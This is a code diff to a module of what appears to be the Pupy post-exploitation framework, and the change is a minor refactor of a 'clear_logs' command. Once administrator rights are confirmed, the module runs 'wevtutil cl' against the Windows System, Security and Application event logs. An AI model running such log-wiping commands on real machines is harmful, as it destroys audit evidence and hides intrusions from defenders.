@@ -13,13 +13,14 @@ class ClearLogs(PupyModule):
     pipe = None
     terminate = threading.Event()
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog="clear_logs", description=self.__doc__)
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog="clear_logs", description=cls.__doc__)
 
     def run(self, args):
         if self.client.desc['intgty_lvl'] != "High" and self.client.desc['intgty_lvl'] != "System":
             self.error('You need admin privileges to clear logs')
-            return 
+            return
 
         cmdenv = {
             'stderr': (subprocess.STDOUT),
@@ -28,7 +29,7 @@ class ClearLogs(PupyModule):
         }
 
         cmdargs = [
-            ['System', 'wevtutil cl System'], 
+            ['System', 'wevtutil cl System'],
             ['Security', 'wevtutil cl Security'],
             ['Application', 'wevtutil cl Application']
         ]
